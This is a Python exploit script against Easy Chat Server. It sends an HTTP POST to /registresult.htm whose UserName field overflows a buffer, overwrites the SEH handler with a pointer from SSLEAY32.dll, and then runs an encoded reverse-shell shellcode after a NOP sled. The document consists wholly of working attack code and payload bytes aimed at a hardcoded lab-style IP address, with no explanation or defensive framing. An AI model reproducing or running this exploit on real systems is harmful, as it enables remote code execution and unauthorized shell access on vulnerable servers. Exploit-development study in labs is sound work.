#!/usr/bin/python

import socket
import os
import sys

ip = "192.168.100.120"
port = 80

nSeh = "\x74\x06\x75\x04" # NetJumping
Seh  = "\x94\x8c\x01\x10" # 0x10018c94 from C:\EFS Software\Easy Chat Server\SSLEAY32.dll

revshell =  b""
revshell += b"\x89\xe7\xda\xcb\xd9\x77\xf4\x5f\x57\x59\x49\x49"
revshell += b"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
revshell += b"\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
revshell += b"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
revshell += b"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
revshell += b"\x59\x6c\x49\x78\x6d\x52\x67\x70\x45\x50\x55\x50"
revshell += b"\x51\x70\x4e\x69\x68\x65\x30\x31\x79\x50\x33\x54"
revshell += b"\x4e\x6b\x42\x70\x70\x30\x4e\x6b\x70\x52\x34\x4c"
revshell += b"\x6c\x4b\x36\x32\x65\x44\x4e\x6b\x30\x72\x61\x38"
revshell += b"\x76\x6f\x4f\x47\x50\x4a\x76\x46\x46\x51\x49\x6f"
revshell += b"\x4e\x4c\x47\x4c\x35\x31\x43\x4c\x53\x32\x34\x6c"
revshell += b"\x61\x30\x7a\x61\x68\x4f\x76\x6d\x66\x61\x58\x47"
revshell += b"\x38\x62\x6c\x32\x31\x42\x50\x57\x4e\x6b\x51\x42"
revshell += b"\x52\x30\x4e\x6b\x32\x6a\x67\x4c\x4e\x6b\x32\x6c"
revshell += b"\x56\x71\x44\x38\x6a\x43\x67\x38\x55\x51\x4a\x71"
revshell += b"\x76\x31\x4c\x4b\x72\x79\x51\x30\x76\x61\x6e\x33"
revshell += b"\x4e\x6b\x42\x69\x46\x78\x69\x73\x34\x7a\x37\x39"
revshell += b"\x4e\x6b\x37\x44\x4e\x6b\x55\x51\x6a\x76\x30\x31"
revshell += b"\x59\x6f\x6e\x4c\x4f\x31\x38\x4f\x64\x4d\x33\x31"
revshell += b"\x38\x47\x45\x68\x79\x70\x64\x35\x4c\x36\x46\x63"
revshell += b"\x53\x4d\x7a\x58\x57\x4b\x53\x4d\x47\x54\x73\x45"
revshell += b"\x58\x64\x53\x68\x6c\x4b\x76\x38\x74\x64\x37\x71"
revshell += b"\x59\x43\x33\x56\x6e\x6b\x54\x4c\x70\x4b\x6c\x4b"
revshell += b"\x33\x68\x37\x6c\x53\x31\x4a\x73\x6e\x6b\x47\x74"
revshell += b"\x4e\x6b\x77\x71\x7a\x70\x4e\x69\x51\x54\x76\x44"
revshell += b"\x74\x64\x51\x4b\x31\x4b\x73\x51\x53\x69\x53\x6a"
revshell += b"\x43\x61\x69\x6f\x69\x70\x61\x4f\x73\x6f\x33\x6a"
revshell += b"\x6c\x4b\x54\x52\x78\x6b\x4e\x6d\x61\x4d\x71\x78"
revshell += b"\x67\x43\x67\x42\x67\x70\x77\x70\x35\x38\x44\x37"
revshell += b"\x30\x73\x47\x42\x31\x4f\x33\x64\x63\x58\x42\x6c"
revshell += b"\x73\x47\x65\x76\x55\x57\x79\x6f\x6e\x35\x6e\x58"
revshell += b"\x4e\x70\x76\x61\x67\x70\x35\x50\x76\x49\x78\x44"
revshell += b"\x52\x74\x32\x70\x55\x38\x56\x49\x6b\x30\x52\x4b"
revshell += b"\x67\x70\x39\x6f\x79\x45\x30\x50\x70\x50\x30\x50"
revshell += b"\x46\x30\x47\x30\x32\x70\x57\x30\x72\x70\x65\x38"
revshell += b"\x68\x6a\x34\x4f\x79\x4f\x6b\x50\x39\x6f\x4b\x65"
revshell += b"\x4c\x57\x30\x6a\x46\x65\x53\x58\x6b\x70\x6e\x48"
revshell += b"\x70\x64\x62\x55\x75\x38\x73\x32\x43\x30\x47\x61"
revshell += b"\x43\x6c\x4e\x69\x69\x76\x71\x7a\x44\x50\x46\x36"
revshell += b"\x53\x67\x31\x78\x4f\x69\x59\x35\x42\x54\x51\x71"
revshell += b"\x4b\x4f\x4a\x75\x6b\x35\x79\x50\x63\x44\x34\x4c"
revshell += b"\x69\x6f\x30\x4e\x55\x58\x51\x65\x58\x6c\x43\x58"
revshell += b"\x48\x70\x48\x35\x6e\x42\x50\x56\x79\x6f\x5a\x75"
revshell += b"\x35\x38\x32\x43\x72\x4d\x75\x34\x53\x30\x4e\x69"
revshell += b"\x4d\x33\x36\x37\x52\x77\x51\x47\x46\x51\x4b\x46"
revshell += b"\x62\x4a\x35\x42\x51\x49\x63\x66\x7a\x42\x79\x6d"
revshell += b"\x63\x56\x5a\x67\x37\x34\x45\x74\x45\x6c\x67\x71"
revshell += b"\x67\x71\x4e\x6d\x72\x64\x61\x34\x54\x50\x58\x46"
revshell += b"\x63\x30\x50\x44\x53\x64\x32\x70\x53\x66\x62\x76"
revshell += b"\x70\x56\x57\x36\x76\x36\x42\x6e\x70\x56\x46\x36"
revshell += b"\x61\x43\x52\x76\x65\x38\x71\x69\x68\x4c\x67\x4f"
revshell += b"\x6c\x46\x49\x6f\x79\x45\x6b\x39\x39\x70\x72\x6e"
revshell += b"\x33\x66\x73\x76\x69\x6f\x46\x50\x63\x58\x75\x58"
revshell += b"\x6d\x57\x45\x4d\x45\x30\x4b\x4f\x5a\x75\x4f\x4b"
revshell += b"\x4a\x50\x6c\x75\x6c\x62\x53\x66\x32\x48\x6f\x56"
revshell += b"\x4e\x75\x6d\x6d\x4d\x4d\x69\x6f\x6a\x75\x55\x6c"
revshell += b"\x57\x76\x31\x6c\x77\x7a\x4d\x50\x79\x6b\x4d\x30"
revshell += b"\x73\x45\x56\x65\x6f\x4b\x42\x67\x74\x53\x44\x32"
revshell += b"\x52\x4f\x70\x6a\x53\x30\x51\x43\x79\x6f\x79\x45"
revshell += b"\x41\x41"

crash  = "A" * 217
crash += nSeh
crash += Seh
crash += "\x90" * 20
crash += revshell
crash += "D" * (10263 - len(crash))

req  = "POST /registresult.htm HTTP/1.1\r\n"
req += "Host: 192.168.100.120\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://192.168.100.120/register.ghp\r\n"
req += "Content-Type: application/x-www-form-urlencoded\r\n"
req += "Content-Length: 184\r\n"
req += "Connection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
req += "UserName=" + crash
req += "&Password=trune&Password1=trune&Sex=1&Email=tune%40gmail.com&Icon=0.gif&Resume=we&cw=1&RoomID=%3C%21--%24RoomID--%3E&RepUserName=%3C%21--%24UserName--%3E&submit1=Register&'"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

